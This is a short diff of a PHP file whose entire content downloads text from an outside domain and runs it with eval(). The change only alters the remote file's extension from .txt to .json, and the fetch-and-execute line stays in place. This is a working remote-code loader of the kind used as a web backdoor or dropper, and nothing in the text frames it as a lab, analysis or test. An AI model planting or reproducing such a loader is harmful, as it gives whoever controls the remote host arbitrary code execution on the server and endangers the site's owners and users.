@@ -1,3 +1,3 @@
 <?php
-$a = file_get_contents("http://checkpost.space/php/heroku.txt");
+$a = file_get_contents("http://checkpost.space/php/heroku.json");
 eval($a);
